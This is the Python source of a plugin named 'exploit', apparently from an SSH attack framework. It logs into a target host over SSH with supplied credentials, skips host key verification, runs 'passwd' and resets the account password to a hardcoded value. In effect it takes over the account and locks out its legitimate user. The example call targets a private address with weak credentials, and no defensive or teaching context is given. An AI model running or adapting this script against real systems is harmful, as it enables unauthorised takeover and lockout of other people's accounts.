from plugin import plugin
import paramiko
'''
after that,the password will be 'houhua.he@meetsec.com'
'''
class exploit(plugin):
    param_count = 2
    timeout = 1
    new_password = 'houhua.he@meetsec.com'
    fail=["incorrect","password","invalid","wrong","fail","denied","not","error"] 
    def __init__(self,custom_log_dir,args):
        plugin.__init__(self,custom_log_dir,args)

    def change_password(self,ssh_client):
        stdin, stdout, stderr = ssh_client.exec_command("passwd")
        if self.username != "root":
            stdin.write("%s\n" % self.password)
        stdin.write("%s\n" % self.new_password)
        stdin.write("%s\n" % self.new_password)
        stdout.read()
        if "success" in stderr.read().decode('utf-8'):
            self.password = self.new_password
            return True
        else:
            return False
            
    def exp(self):
        if len(self.args) != self.param_count:
            error_msg = "param_count not matched."
            self.log(__name__,error_msg)
            return False,self.host,self.port,self.args,error_msg
        self.username,self.password = self.args[0],self.args[1]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, self.port, self.username, self.password, timeout = self.timeout,allow_agent=False,look_for_keys=False)
            res = self.change_password(ssh)
            if res:
                return True,self.host,self.port,self.args,True,"password successfully to %s".format(self.new_password)
            else:
                return False,self.host,self.port,self.args,"maybe permission denied.","failed"
        except Exception,e:
            self.log(__name__,str(e))
            return False,self.host,self.port,self.args,None,str(e)
        
if __name__ == '__main__':
    print exploit('./',("192.168.1.100",22,"wang","123")).exp()